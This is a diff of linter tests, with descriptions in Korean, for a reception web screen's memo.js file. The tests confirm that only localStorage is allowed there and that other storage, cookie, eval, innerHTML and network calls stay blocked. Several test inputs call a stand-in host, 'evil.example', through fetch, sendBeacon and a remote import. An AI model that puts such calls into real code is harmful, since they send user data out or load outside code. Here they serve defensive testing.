@@ -1056,6 +1056,58 @@ describe('AC-1407.6 접수 현황 화면 코드(reception/www/**): 저장소·�
     expect(rules).not.toContain('no-restricted-syntax')
   })
 
+  it('AC-3405.1: 브라우저 저장소 예외는 reception/www/memo.js의 localStorage 하나뿐이다(이 기기 메모)', async () => {
+    const MEMO = 'reception/www/memo.js'
+    const code = [
+      "const KEY = 'reception-memo'",
+      'export function load() {',
+      '  try {',
+      "    return JSON.parse(localStorage.getItem(KEY) ?? 'null')",
+      '  } catch {',
+      '    return null',
+      '  }',
+      '}',
+      'export const save = (memo) => window.localStorage.setItem(KEY, JSON.stringify(memo))',
+      'export const drop = () => globalThis.localStorage.removeItem(KEY)',
+    ].join('\n')
+    expect(await lint(code, MEMO)).toEqual([])
+    // 다른 화면 파일·하위 폴더·다른 끝 이름의 같은 글은 그대로 막힌다
+    for (const file of ['reception/www/app.js', 'reception/www/board.js', 'reception/www/sub/memo.js', 'reception/www/memo.mjs']) {
+      expect(await errorRules("localStorage.setItem('reception-memo', '{}')", file), file).toContain('no-restricted-globals')
+      expect(await errorRules("window.localStorage.setItem('reception-memo', '{}')", file), file).toContain('no-restricted-properties')
+    }
+  })
+
+  it.each([
+    ["sessionStorage.setItem('k', 'v')", 'no-restricted-globals'],
+    ["indexedDB.open('k')", 'no-restricted-globals'],
+    ["caches.open('k')", 'no-restricted-globals'],
+    ["window.sessionStorage.setItem('k', 'v')", 'no-restricted-properties'],
+    ["self.indexedDB.open('k')", 'no-restricted-properties'],
+    ["document.cookie = 'k=v'", 'no-restricted-properties'],
+    ['navigator.storage.persist()', 'no-restricted-properties'],
+    ["navigator.serviceWorker.register('/sw.js')", 'no-restricted-properties'],
+    ['console.log(1)', 'no-console'],
+    ['globalThis.console.log(1)', 'no-restricted-properties'],
+    ["fetch('https://evil.example/api')", 'no-restricted-syntax'],
+    ["fetch('//evil.example/api')", 'no-restricted-syntax'],
+    ["window.fetch('/api/board')", 'no-restricted-properties'],
+    ['new XMLHttpRequest()', 'no-restricted-globals'],
+    ["navigator.sendBeacon('https://evil.example', 'x')", 'no-restricted-properties'],
+    ['export const put = (el, name) => { el.innerHTML = name }', 'no-restricted-properties'],
+    ["eval('1')", 'no-restricted-globals'],
+    ["import x from 'https://evil.example/x.js'\nexport { x }", 'no-restricted-syntax'],
+  ])('AC-3405.1: memo.js도 %s → %s (localStorage 말고는 다른 화면 파일과 같은 울타리)', async (code, rule) => {
+    expect(await errorRules(code, 'reception/www/memo.js')).toContain(rule)
+  })
+
+  it('AC-3405.1: memo.js 블록이 기존 금지(client.ts import)를 덮어 풀지 않는다', async () => {
+    const path = '../../src/lib/bridge/client'
+    expect(await errorRules(`import { connectBridge } from '${path}'\nexport { connectBridge }`, 'reception/www/memo.js')).toContain(
+      'no-restricted-imports',
+    )
+  })
+
   it('AC-1407.6: vitest가 화면 시험(reception/**/*.test.ts)을 잡고, Next 형 검사는 reception을 뺀다', () => {
     const vitestConfig = readFileSync(fileURLToPath(new URL('../vitest.config.ts', import.meta.url)), 'utf-8')
     expect(vitestConfig).toContain("'reception/**/*.test.ts'")
